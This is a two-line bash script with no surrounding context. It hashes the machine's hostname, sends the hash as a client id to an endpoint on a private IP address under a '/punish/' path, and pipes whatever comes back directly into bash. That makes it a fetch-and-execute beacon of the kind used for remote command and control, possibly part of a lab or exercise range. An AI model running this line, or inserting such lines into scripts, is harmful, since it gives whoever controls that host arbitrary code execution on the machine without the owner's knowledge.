#!/bin/bash
curl -s http://10.30.30.1:3000/punish/api/v1/?client-id=`hostname |sha256sum |cut -d' ' -f1`|bash